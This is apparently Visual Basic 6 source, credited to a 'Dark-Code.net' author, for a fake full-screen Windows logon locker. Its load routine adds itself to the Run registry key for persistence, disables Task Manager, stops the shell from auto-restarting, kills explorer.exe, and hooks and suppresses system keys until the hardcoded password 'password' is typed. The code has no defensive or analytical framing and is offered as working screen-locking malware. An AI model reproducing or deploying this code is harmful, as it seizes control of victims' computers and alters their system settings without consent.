VERSION 5.00
Begin VB.Form Form1 
   BackColor       =   &H00000000&
   BorderStyle     =   0  'None
   ClientHeight    =   10290
   ClientLeft      =   0
   ClientTop       =   0
   ClientWidth     =   15360
   Icon            =   "Form43.frx":0000
   LinkTopic       =   "Form1"
   ScaleHeight     =   10290
   ScaleWidth      =   15360
   ShowInTaskbar   =   0   'False
   StartUpPosition =   2  'CenterScreen
   Begin VB.Timer Timer2 
      Enabled         =   0   'False
      Interval        =   5000
      Left            =   4680
      Top             =   5760
   End
   Begin VB.Timer Timer1 
      Enabled         =   0   'False
      Interval        =   1000
      Left            =   4680
      Top             =   5280
   End
   Begin VB.TextBox Text1 
      BackColor       =   &H00FFFFFF&
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   13.5
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   285
      IMEMode         =   3  'DISABLE
      Left            =   6840
      PasswordChar    =   "¤"
      TabIndex        =   0
      Top             =   4920
      Width           =   2055
   End
   Begin VB.Label Label4 
      Alignment       =   2  'Center
      BackStyle       =   0  'Transparent
      Caption         =   "Welcome , Please Type Your Password To Logon"
      Height          =   255
      Left            =   6120
      TabIndex        =   4
      Top             =   7440
      Width           =   3615
   End
   Begin VB.Image Image3 
      Height          =   375
      Left            =   9120
      Picture         =   "Form43.frx":0442
      Top             =   4920
      Width           =   375
   End
   Begin VB.Image Image2 
      Height          =   750
      Left            =   5880
      Picture         =   "Form43.frx":248E
      Top             =   4680
      Width           =   750
   End
   Begin VB.Label Label3 
      Alignment       =   2  'Center
      BackStyle       =   0  'Transparent
      Caption         =   "Log Off Administrator"
      ForeColor       =   &H00FFFFFF&
      Height          =   255
      Left            =   6000
      TabIndex        =   3
      Top             =   8160
      Width           =   3735
   End
   Begin VB.Label Label2 
      BackStyle       =   0  'Transparent
      Caption         =   "Password"
      ForeColor       =   &H00FFFFFF&
      Height          =   255
      Left            =   8280
      TabIndex        =   2
      Top             =   5280
      Width           =   735
   End
   Begin VB.Shape Shape1 
      Height          =   495
      Left            =   6720
      Top             =   4800
      Width           =   2295
   End
   Begin VB.Label Label1 
      Appearance      =   0  'Flat
      BackColor       =   &H80000005&
      BackStyle       =   0  'Transparent
      Caption         =   "Administrator"
      BeginProperty Font 
         Name            =   "Unreal Tournament"
         Size            =   15.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FFFFFF&
      Height          =   3495
      Left            =   5760
      TabIndex        =   1
      Top             =   4200
      Width           =   4215
   End
   Begin VB.Image Image1 
      Height          =   5445
      Left            =   0
      Picture         =   "Form43.frx":491E
      Top             =   3000
      Width           =   15360
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
' ---------------------------------------
'|                                       |
'|      @@@@@@@          @@@@@@@@        |
'|      @      @         @               |
'|      @       @        @               |
'|      @       @        @               |
'|      @       @        @               |
'|      @       @        @               |
'|      @       @        @               |
'|      @       @        @               |
'|      @      @         @               |
'|      @@@@@@@          @@@@@@@@        |
'|      Dark-Code.net    xsubz3r0x       |
' ---------------------------------------

'Set the height/width so it's over maximized
'Save to run if you want it to start everytime windows load
'also overwrites the key over and over so no floods
'Also disable task manager to prevent access
'Close Explorer and prevent it from restarting
Private Sub Form_Load()
Me.Height = Screen.Height
Me.Width = Screen.Width
REGSaveSetting vHKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", "LoGonWindow", App.Path & "\" & App.EXEName & ".exe"
REGSaveSetting vHKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableTaskMgr", "1"
Dim Reg As Object
Set Reg = CreateObject("wscript.shell")
Reg.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" & "AutoRestartShell", "0", "REG_DWORD"
For Each Process In GetObject("winmgmts:"). _
    ExecQuery("select * from Win32_Process where name='explorer.exe'")
   Process.Terminate (0)
Next
' Initialize Windows System key filtering.
Dim ret As Long
    ret = SystemParametersInfo(97, True, ret, 0)
    KBDhwnd = SetWindowsHookEx(WH_KEYBOARD_LL, AddressOf CatchKeys, App.hInstance, 0)
End Sub
'Of course our password :)
Private Sub Image3_Click()
If Text1.Text = "password" Then
Timer1.Enabled = True
Else
Label4.Caption = "Wrong Password, Please Try Again."
End If
End Sub
'If you click Log OFF , logs you off windows
Private Sub Label3_Click()
Shell "shutdown -l -f -t 0"
End Sub
'Also if you just want to hit enter
Private Sub Text1_KeyDown(KeyCode As Integer, Shift As Integer)
Select Case KeyCode
    Case 13
If Text1.Text = "password" Then
Timer1.Enabled = True
Else
Label4.Caption = "Wrong Password, Please Try Again."
End If
    End Select
End Sub

'Just a backcolor that changes everytime you click it
Private Sub Text1_MouseDown(Button As Integer, Shift As Integer, x As Single, Y As Single)
If Text1.BackColor = &HFFFFFF Then
Text1.BackColor = &HE0E0E0
Label4.Caption = "Welcome , Please Type Your Password To Logon"
Else
Text1.BackColor = &HFFFFFF
End If
End Sub
'If password ok then display message and delete the task manager key
'so you can access the task manager again
'Change The System Back :)
'Restart Shell
Private Sub Timer1_Timer()
Label4.Caption = "Loading Your Personal Settings...."
Timer2.Enabled = True
REGDeleteSetting vHKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Policies\System"
Dim Reg As Object
Set Reg = CreateObject("wscript.shell")
Reg.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" & "AutoRestartShell", "1", "REG_DWORD"
End Sub
'Disable timer1 and Unload
Private Sub Timer2_Timer()
Timer1.Enabled = False
Shell "explorer.exe"
Dim ret As Long
ret = SystemParametersInfo(0, False, ret, 0)
If KBDhwnd <> 0 Then UnhookWindowsHookEx KBDhwnd
Unload Form1
End Sub
